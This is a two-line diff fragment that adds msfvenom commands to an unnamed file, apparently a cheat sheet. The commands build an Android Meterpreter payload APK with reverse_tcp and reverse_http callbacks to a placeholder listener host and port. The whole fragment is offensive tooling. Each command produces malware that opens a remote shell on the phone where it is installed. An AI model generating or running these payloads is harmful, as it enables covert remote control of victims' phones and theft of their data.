@@ -1,0 +1,2 @@
+msfvenom -p android/meterpreter/reverse_tcp LPORT=<listener_port> LHOST=<listener_host> R > android_payload.apk
+msfvenom -p android/meterpreter/reverse_http LPORT=<listener_port> LHOST=<listener_host> R > android_payload.apk
